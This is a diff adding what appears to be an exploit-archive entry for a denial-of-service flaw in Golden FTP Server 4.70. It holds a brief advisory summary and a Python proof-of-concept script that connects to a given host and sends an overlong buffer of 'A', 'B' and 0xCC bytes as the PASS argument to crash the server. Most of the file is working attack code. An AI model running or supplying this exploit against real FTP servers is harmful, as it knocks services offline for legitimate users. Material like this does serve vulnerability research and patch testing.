@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/45924/info
+
+Golden FTP Server is prone to a denial-of-service vulnerability.
+
+Exploits will cause the application to crash, denying service to legitimate users.
+
+Golden FTP Server 4.70 is vulnerable; other versions may also be affected. 
+
+import socket
+import sys
+import time
+ 
+Bs = &#039;\x42&#039; * 4
+ 
+buffer = &#039;\x41&#039; * 533 + Bs + &#039;\xcc&#039; * 300
+ 
+if len(sys.argv) != 3:
+        print "Usage: ./goldenftp.py <ip> <port>"
+        sys.exit()
+  
+ip   = sys.argv[1]
+port = sys.argv[2]
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:   
+    print "[*] Sending evil buffer"
+    s.connect((ip,int(port)))
+    s.recv(1024)
+    time.sleep(2)
+    s.send(&#039;USER anonymous&#039;+ &#039;\r\n&#039;)
+    s.recv(1024)
+    time.sleep(3)  
+    s.send(&#039;PASS &#039; + buffer + &#039;\r\n&#039;)
+    s.recv(1024)   
+    time.sleep(1)
+    s.close()
+except:
+    print "Can&#039;t Connect to Server"
+    sys.exit()
